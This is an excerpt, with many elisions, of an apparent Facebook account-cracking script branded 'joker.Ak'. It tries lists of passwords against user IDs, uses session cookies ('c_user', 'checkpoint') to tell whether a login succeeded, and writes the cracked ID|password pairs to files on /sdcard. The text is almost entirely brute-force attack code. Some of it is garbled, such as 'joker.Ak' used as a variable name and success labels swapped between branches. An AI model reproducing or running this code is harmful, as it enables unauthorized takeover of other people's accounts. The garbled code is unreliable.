...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/joker.Ak.txt')
				linex()
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			joker.Ak=session.cookies.get_dict().keys()
			if "c_user" in joker.Ak:
				print('\r\r\033[1;31m[joker.Ak-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/joker.Ak-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in joker.Ak:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[joker.Ak-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/joker.Ak-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in joker.Ak:
				...
				print('\r\r\033[1;32m[joker.Ak-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[joker.Ak-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[joker.Ak-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[joker.Ak-OK] '+cid+' | '+ps+'\33[0;97m')
